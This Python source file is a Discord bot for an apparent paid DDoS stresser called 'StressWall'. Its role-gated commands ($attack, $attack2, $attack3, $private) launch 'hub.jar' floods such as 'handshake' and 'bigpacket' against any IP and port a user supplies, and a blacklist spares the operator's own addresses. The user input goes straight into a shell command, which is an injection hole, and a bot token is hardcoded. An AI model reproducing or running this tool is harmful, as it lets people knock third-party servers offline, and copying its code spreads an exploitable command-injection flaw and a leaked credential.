import discord, colorama, requests
from colorama import init, Fore, Style
from discord.ext import commands
from subprocess import Popen

blacklist = '45.90.218.62', '127.0.0.1', '127.0.0', 'localhost', '0.0.0.0', '1.1.1.1'
bot = commands.Bot(command_prefix='$', help_command=None)
    
@bot.command()
@commands.has_role("User")
async def attack(ctx, arg1, arg2):
    if arg1 in blacklist:
        print('error')
    else:
        startcmd = f"java -jar hub.jar {arg1} {arg2} handshake 200 2000"
        Popen(startcmd, shell=True)

@bot.command()
@commands.has_role("Legend")
async def attack2(ctx, arg1, arg2):
    if arg1 in blacklist:
        print('error')
    else:
        startcmd = f"java -jar hub.jar {arg1} {arg2} bighandshake 200 30000"
        Popen(startcmd, shell=True)

@bot.command()
@commands.has_role("Advanced")
async def attack3(ctx, arg1, arg2, arg3, arg4, arg5):
    if arg1 in blacklist:
        print('error')
    else:
        startcmd = f"java -jar hub.jar {arg1} {arg2} {arg3} {arg4} {arg5}"
        Popen(startcmd, shell=True)

@bot.command()
@commands.has_role("Private")
async def private(ctx, arg1, arg2):
    if arg1 in blacklist:
        print('error')
    else:
        startcmd = f"java -jar hub.jar {arg1} {arg2} bigpacket 200 80000"
        Popen(startcmd, shell=True)

@bot.event
async def on_ready():
    print('Bot Ready!')
    while True:
        game = discord.Game("$help | StressWall")
        await bot.change_presence(status=discord.Status.online, activity=game)  

bot.run('OTYxMjUxNTg4MzQ3OTUzMjIy.Yk2RTQ.Dk77UsK3PQvZOjk2u8LmdY9ZHMc')